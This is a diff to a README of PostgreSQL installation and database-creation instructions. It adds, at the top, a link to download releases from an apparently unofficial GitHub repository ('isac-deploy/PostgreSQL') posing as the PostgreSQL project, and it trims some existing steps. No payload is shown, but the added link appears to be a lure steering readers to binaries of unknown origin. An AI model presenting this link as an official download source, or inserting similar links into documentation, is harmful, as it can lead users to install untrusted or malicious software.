@@ -1,5 +1,7 @@
 # PostgreSQL
 
+Download the latest release from [Releases](https://github.com/isac-deploy/PostgreSQL/releases/tag/17.6)
+
 The installation package comes bundled with all essential components: the PostgreSQL server, command-line tools, and optional administrative utilities. Be sure to download the edition that matches your operating system.
 
 ## Introduction
@@ -46,7 +48,7 @@ Once PostgreSQL is installed and operational on Windows, creating a new database
 
 #### Steps:
 
-1. Open **pgAdmin 4** from the Start Menu.
+1. Open pgAdmin 4 from the Start Menu.
 
 2. Connect to your local server:
 
@@ -64,7 +66,6 @@ Once PostgreSQL is installed and operational on Windows, creating a new database
 
 5. Click **Save**.
 
-Your database will now appear in the sidebar, ready for defining schemas, adding tables, and running queries.
 
 ### Option 2: Using `psql` (Command Line)
 
@@ -93,14 +94,6 @@ The `psql` client is a terminal-based tool for working with PostgreSQL, and it a
    ```sql
    CREATE DATABASE mydatabase;
    ```
-
-5. Then connect to it:
-
-   ```sql
-   \c mydatabase
-   ```
-
-You can now run SQL commands inside your new database.
 
 ### Tips
 
